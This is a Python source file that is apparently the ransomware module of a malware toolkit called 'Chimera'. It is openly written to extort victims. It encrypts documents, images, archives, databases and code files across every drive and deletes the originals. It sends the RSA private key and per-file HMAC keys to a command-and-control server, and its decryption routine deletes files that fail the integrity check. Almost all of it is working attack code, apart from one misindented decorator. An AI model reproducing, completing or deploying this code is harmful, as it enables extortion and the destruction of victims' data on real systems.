#~/Desktop/Chimera/PayloadBuilder/modules/ransomware.py
"""
Ransomware Engine Module - Chimera
===================================
- Unique RSA-2048 key pair per victim
- Per-file AES-256-CBC encryption with random IV
- RSA encryption of AES keys (multi-layer)
- HMAC-SHA256 integrity tag to prevent tampering
- Automatic file deletion on integrity failure (anti-decryption)
- Sends private key and HMAC keys to C2 server; no keys remain on victim
"""

import os
import time
import struct
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256, HMAC
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad


class RansomwareEngine:
    """
    Advanced ransomware engine with multi-layer encryption.
    On initialization, generates a unique RSA key pair for the victim.
    The private key is immediately exported and can be sent to C2;
    it must never be stored locally.
    """

    def __init__(self, send_key_callback=None):
        """
        send_key_callback: optional function to send private key & HMAC keys to C2.
        It should accept a dictionary: {'victim_id':..., 'type':..., 'content':...}
        """
        self.public_key = None
        self.private_key = None
        self.encrypted_files = []
        self.hmac_keys = {}          # mapping: encrypted_filepath -> HMAC key (bytes)
        self.target_extensions = [
            '.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.jpeg', '.png',
            '.gif', '.bmp', '.tiff', '.psd', '.ai', '.svg',  # more images
            '.zip', '.rar', '.7z', '.mp3', '.mp4', '.avi', '.mov',
            '.ppt', '.pptx', '.odt', '.ods', '.odp', '.csv',
            '.doc', '.xls', '.ppt', '.xml', '.json', '.log',
            '.db', '.sqlite', '.bak', '.backup', '.php', '.html',
            '.py', '.js', '.css', '.c', '.cpp', '.java', '.go', # code files
        ]
        self.send_to_c2 = send_key_callback or (lambda data: None)

    def generate_keys(self):
        """
        Generate a fresh RSA-2048 key pair and a master AES key.
        The private key is sent to C2 immediately and then removed from memory.
        Returns a dict with base64-encoded public key.
        """
        try:
            # RSA key pair
            self.rsa_key = RSA.generate(2048)
            self.private_key = self.rsa_key.export_key()
            self.public_key = self.rsa_key.publickey().export_key()

            # Master AES key (optional, we use per-file keys anyway)
            self.aes_key = get_random_bytes(32)

            # Send private key to C2 immediately (do NOT store it)
            self._send_private_key()

            # Wipe private key from memory
            self.rsa_key = None
            self.private_key = None

            return {
                "aes_key": base64.b64encode(self.aes_key).decode('utf-8'),
                "rsa_public": base64.b64encode(self.public_key).decode('utf-8')
            }
        except Exception as e:
            print(f"[RANSOM] Key generation error: {e}")
            return None

    def _send_private_key(self):
        """Transmit the private key to C2."""
        if self.private_key:
            data = {
                "type": "ransomware_keys",
                "content": {
                    "private_key": base64.b64encode(self.private_key).decode('utf-8'),
                    "hmac_keys": {}
                }
            }
            self.send_to_c2(data)

    def _send_hmac_key(self, filepath, hmac_key):
        """Send HMAC key for a specific file to C2."""
        self.hmac_keys[filepath] = hmac_key
        data = {
            "type": "hmac_key",
            "content": {
                "file": filepath,
                "hmac_key": base64.b64encode(hmac_key).decode('utf-8')
            }
        }
        self.send_to_c2(data)

    def encrypt_specific_file(self, filepath):
        """Encrypt a single file with AES-256-CBC, RSA-encrypted key, and HMAC."""
        try:
            if not os.path.exists(filepath):
                return {"status": "error", "message": "File not found"}
            if os.path.isdir(filepath):
                return {"status": "error", "message": "Path is a directory"}

            # Check permissions
            if not os.access(filepath, os.R_OK):
                return {"status": "error", "message": "No read permission"}
            if not os.access(os.path.dirname(filepath), os.W_OK):
                return {"status": "error", "message": "No write permission in directory"}

            # Per-file AES key
            file_aes_key = get_random_bytes(32)

            with open(filepath, 'rb') as f:
                plaintext = f.read()

            iv = get_random_bytes(16)
            cipher = AES.new(file_aes_key, AES.MODE_CBC, iv)
            ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

            # Encrypt AES key with RSA public key
            rsa_cipher = PKCS1_OAEP.new(RSA.import_key(self.public_key))
            encrypted_aes_key = rsa_cipher.encrypt(file_aes_key)

            # HMAC for integrity
            hmac_key = get_random_bytes(32)
            h = HMAC.new(hmac_key, digestmod=SHA256)
            h.update(encrypted_aes_key + ciphertext)
            signature = h.digest()

            # Build final packet
            aes_key_len = len(encrypted_aes_key)
            header = iv + struct.pack('<H', aes_key_len) + encrypted_aes_key
            final_data = header + ciphertext + signature

            encrypted_path = filepath + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(final_data)

            os.remove(filepath)

            self.encrypted_files.append(encrypted_path)
            self._send_hmac_key(encrypted_path, hmac_key)

            return {"status": "success", "file": filepath, "encrypted": encrypted_path}
        except PermissionError as e:
            return {"status": "error", "message": f"Permission denied: {e}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def encrypt_directory(self, dirpath):
        """Encrypt all target files in a directory recursively."""
        results = []
        if not os.path.exists(dirpath):
            return {"status": "error", "message": "Directory not found"}
        for root, _, files in os.walk(dirpath):
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in self.target_extensions:
                    full_path = os.path.join(root, file)
                    if not full_path.endswith('.encrypted'):
                        result = self.encrypt_specific_file(full_path)
                        results.append(result)
                        time.sleep(0.02)
        return {"status": "success", "files_encrypted": len(self.encrypted_files), "details": results}

    def encrypt_full_system(self):
        """Encrypt all drives except system folders, with verbose logging."""
        drives = []
        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                drives.append(drive)

        # Only skip critical system folders – user data is safe
        exclude_dirs = ['Windows', 'Program Files', 'Program Files (x86)',
                        'System32', 'System', 'Temp', 'boot']

        results = []
        total_encrypted = 0
        for drive in drives:
            print(f"[RANSOM] Scanning drive: {drive}")
            for root, dirs, files in os.walk(drive, topdown=True):
                # Skip excluded directories
                dirs[:] = [d for d in dirs if d not in exclude_dirs]
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext not in self.target_extensions:
                        continue
                    full_path = os.path.join(root, file)
                    if full_path.endswith('.encrypted'):
                        continue
                    print(f"[RANSOM] Encrypting: {full_path}")
                    result = self.encrypt_specific_file(full_path)
                    results.append(result)
                    if result.get('status') == 'success':
                        total_encrypted += 1
                    else:
                        print(f"[RANSOM] FAILED: {full_path} – {result.get('message')}")
                    time.sleep(0.05)  # small delay
        return {"status": "success", "files_encrypted": total_encrypted, "details": results}

        @staticmethod
    def safe_decrypt_file(encrypted_path, private_key_pem, hmac_key, log_callback=None):
        """Decrypt a file; if HMAC fails, the file is deleted."""
        def log(msg):
            if log_callback:
                log_callback(msg)
            else:
                print(msg)
        
        try:
            with open(encrypted_path, 'rb') as f:
                data = f.read()

            iv = data[:16]
            aes_key_len = struct.unpack('<H', data[16:18])[0]
            encrypted_aes_key = data[18:18 + aes_key_len]
            offset = 18 + aes_key_len
            signature = data[-32:]
            ciphertext = data[offset:-32]

            # Verify HMAC
            h = HMAC.new(hmac_key, digestmod=SHA256)
            h.update(encrypted_aes_key + ciphertext)
            try:
                h.verify(signature)
                log(f"HMAC verification OK for {encrypted_path}")
            except ValueError:
                log(f"❌ HMAC verification FAILED for {encrypted_path} – deleting file")
                if os.path.exists(encrypted_path):
                    os.remove(encrypted_path)
                raise Exception("Integrity check failed – file deleted.")

            rsa_cipher = PKCS1_OAEP.new(RSA.import_key(private_key_pem))
            file_aes_key = rsa_cipher.decrypt(encrypted_aes_key)
            log(f"RSA decryption of AES key OK for {encrypted_path}")

            cipher = AES.new(file_aes_key, AES.MODE_CBC, iv)
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)

            original_path = encrypted_path.replace('.encrypted', '')
            with open(original_path, 'wb') as f:
                f.write(plaintext)

            os.remove(encrypted_path)
            log(f"✅ Decrypted and removed {encrypted_path}")
            return True
        except Exception as e:
            log(f"❌ Error decrypting {encrypted_path}: {e}")
            raise e
